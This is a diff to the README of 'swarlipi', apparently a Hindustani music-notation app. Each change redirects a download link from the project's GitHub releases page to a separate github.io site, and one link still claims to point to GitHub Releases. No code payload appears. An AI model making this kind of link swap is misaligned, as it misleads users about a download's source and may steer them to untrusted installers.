@@ -1,6 +1,6 @@
 # 🎵 swarlipi - Beautiful Indian Classical Music Notation in Real Unicode Text
 
-[![Download swarlipi](https://img.shields.io/badge/Download-swarlipi-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/Mxy5822/swarlipi/releases)
+[![Download swarlipi](https://img.shields.io/badge/Download-swarlipi-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://mxy5822.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to swarlipi — the easy way to write and share Bhatkhande (Hindustani c
 
 ## 📥 Download and Install
 
-**Visit this link to download the application:** [https://github.com/Mxy5822/swarlipi/releases](https://github.com/Mxy5822/swarlipi/releases)
+**Visit this link to download the application:** [https://mxy5822.github.io](https://mxy5822.github.io)
 
 Click the link above to go to the download page. Look for the newest version at the top of the list. Click the download button for your computer. The download will start automatically. Once the download finishes, you're ready to use swarlipi.
 
@@ -42,7 +42,7 @@ Choose from five stunning scripts to write your notation:
 
 ### Step 1: Download swarlipi
 
-Visit the [download page](https://github.com/Mxy5822/swarlipi/releases) and get the latest version for your computer.
+Visit the [download page](https://mxy5822.github.io) and get the latest version for your computer.
 
 ### Step 2: Open the Application
 
@@ -139,12 +139,12 @@ The real magic is in the details — every komal, every tivra, every pause is re
 
 ## 🔄 Stay Updated
 
-Check the [releases page](https://github.com/Mxy5822/swarlipi/releases) regularly for updates. New features and improvements are added frequently based on user feedback.
+Check the [releases page](https://mxy5822.github.io) regularly for updates. New features and improvements are added frequently based on user feedback.
 
 ## 🌟 Start Creating Beautiful Notation Today
 
 Download swarlipi now and experience the joy of creating clean, shareable Hindustani classical music notation. Your compositions deserve the best — give them swarlipi.
 
-**[Download swarlipi from GitHub Releases](https://github.com/Mxy5822/swarlipi/releases)**
+**[Download swarlipi from GitHub Releases](https://mxy5822.github.io)**
 
 Keywords: bengali, bhatkhande, devanagari, gujarati, gurmukhi, hindustani, indian-classical-music, music-notation, notation, sargam, typography, unicode
